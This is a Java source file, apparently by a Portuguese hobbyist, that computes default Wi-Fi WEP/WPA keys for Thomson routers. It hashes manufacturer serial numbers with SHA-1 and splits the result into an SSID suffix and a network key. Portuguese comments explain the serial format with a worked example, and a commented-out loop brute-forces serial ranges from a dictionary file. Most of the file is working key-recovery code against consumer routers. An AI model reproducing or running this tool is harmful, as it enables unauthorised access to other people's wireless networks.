
import java.io.*;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.*;

/**
 *
 * @author pedropetz
 */
public class crackarthomson {

    static private List<String> readFile(String filename) {
        List<String> records = new ArrayList<String>();
        try {
            BufferedReader reader = new BufferedReader(new FileReader(filename));
            String line;
            while ((line = reader.readLine()) != null) {
                records.add(line);
            }
            reader.close();
            return records;
        } catch (Exception e) {
            System.err.format("Exception occurred trying to read '%s'.", filename);
            e.printStackTrace();
            return null;
        }
    }

    public static String makeSHA1Hash(String input)
            throws NoSuchAlgorithmException {
        MessageDigest md = MessageDigest.getInstance("SHA1");
        md.reset();
        byte[] buffer = input.getBytes();
        md.update(buffer);
        byte[] digest = md.digest();

        String hexStr = "";
        for (int i = 0; i < digest.length; i++) {
            hexStr += Integer.toString((digest[i] & 0xff) + 0x100, 16).substring(1);
        }
        return hexStr;
    }

    public static void criaPass(String ssidx) {
        //AeSimpleSHA1 sha1 = new AeSimpleSHA1();
        try {
            String sha1 = makeSHA1Hash(ssidx);
            String pass = sha1.substring(0, 10);
            String ssid = sha1.substring(sha1.length() - 6);

            System.out.println(ssid + "    |    " + pass);

        } catch (NoSuchAlgorithmException e) {
        }
    }

    public static void main(String[] args) {

        String ssid = "";

        List<String> lista = new ArrayList<String>();


//         CP0817AH1AB (A1)
//         * 0817AH1AB 
//         * 0817AH
//         * 
//         * CP0[45678][0-9]{2}[0-9A-Z]{3}
//		
//         CP YY WW PP XXX (CC)
//         Onde cada um têm o seu próprio significado:
//
//         YY - Ano de Fabrico
//         WW – Semana de Fabrico
//         PP – Código do Produto
//         XXX - Desconhecido
//         CC – Código de Configuração	
//		
//         * Olhamos então para o exemplo CP0817AH1AB (A1) retiramos o CC e o PP e ficará:CP08171AB
//
//         * Convertemos o 1AB para hexadecimal que nos dará 314142 em hexadecimal ficando assim
//
//         CP0817314142
//
//         * Criamos o hash sha1 do texto anterior o que nos dará bc8c18aec9e740c37be79e7f2058c50fd922e4bb
//
//         Onde o 22e4bb é o SSID deste numero de série Thomson22E4BB e bc8c18aec9 é a chave de rede wep/wpa 



        lista = readFile("/Users/pedropetz/Desktop/Devolper/Devel. iPhone/Descobrir pass/MEO/dic.lst");

        //System.out.println(hex1);
        // mudar o desconhecido pelo hex do desconhecido
        //int tamLista = lista.size();

        String hex1 = "";
        
        String tres = "1AB";
        
        for (int s = 0; s < 3; s++) {
            int x = (int) tres.charAt(s);
            hex1 += Integer.toHexString(x);
        }

        ssid = "CP0817" + hex1;
        System.out.println(ssid);
        criaPass(ssid);
        

//        for (int i = 4; i < 10; i++) {
//            for (int j = 1; j < 10; j++) {
//                for (int h = 0; h < tamLista; h++) {
//                    hex1 = "";
//                    String xpto = lista.get(h);
//                    for (int s = 0; s < 3; s++) {
//                        int x = (int) xpto.charAt(s);
//                        hex1 += Integer.toHexString(x);
//                    }
//
//                    ssid = "CP0" + i + "0" + j + hex1;
//                    criaPass(ssid);
//                }
//            }
//
//            for (int j = 10; j < 55; j++) {
//                for (int h = 0; h < tamLista; h++) {
//                    hex1 = "";
//                    String xpto = lista.get(h);
//                    for (int s = 0; s < 3; s++) {
//                        int x = (int) xpto.charAt(s);
//                        hex1 += Integer.toHexString(x);
//                    }
//
//                    ssid = "CP0" + i + j + hex1;
//                    criaPass(ssid);
//                }
//            }
//        }
    }
}
// tirar CC
//        ssid = ssid.substring(0, ssid.length() - 4);
//
//        System.out.println(ssid);
//
//
//        String z = ssid.substring(ssid.length() - 3);//”1AB”;
//
//        System.out.println(z);
//
//        // tirar PP
//        ssid = ssid.substring(0, ssid.length() - 5);
//
//        System.out.println(ssid);
//
//
//        String hex1 = "";
//        for (int i = 0; i < z.length(); i++) {
//            int x = (int) z.charAt(i);
//            hex1 += Integer.toHexString(x);
//        }